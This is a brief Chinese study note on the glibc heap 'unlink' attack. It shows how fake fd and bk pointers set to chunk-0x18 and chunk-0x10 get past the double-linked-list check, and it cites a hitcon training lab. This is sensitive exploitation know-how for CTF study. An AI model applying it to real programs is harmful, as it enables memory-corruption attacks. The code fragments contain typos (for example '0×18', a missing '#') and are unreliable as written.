
[slides](https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf)

1、伪造如下：
```c
chunk=0x0602280;   // (P 是将要合并到的堆地址，P 存在于 chunk 中，相当于*chunk=P)
P_fd=chunk-0×18=0x602268 // 绕过 FD->bk == P
P_bk=chunk-0x10=0x602270 // 绕过 BK->fd == P
```

2、绕过技巧：
```c
define unlink (P, BK, FD){
  FD=P->fd; // FD=0x602268
  BK=P->bk；// BK=0x602270
  if (builtin_expect (FD->bk!=P||BK->fd!=P,0)) 
                 // \FD->bk =*(0x602268+0×18)|*(0x602280)=P 
                 // \BK->fd =*(0X602270+0×10) =*0X602280)=P ,绕过！
  malloc printerr (check action,"corrupted double-linked list", P, AV);
  FD->bk=BK; // \*(0X602268+0×18)|*(0×602280)=0×602270
  BK->fd=FD; // \*(0x602270+0×10)|*(0x602280)=0X602268 -- 这里是最终写入效果
}
// 最终效果就是往 chunk 里面写入了 chunk-0x18 的值！
```

# Example
* hitcon training-lab11-2
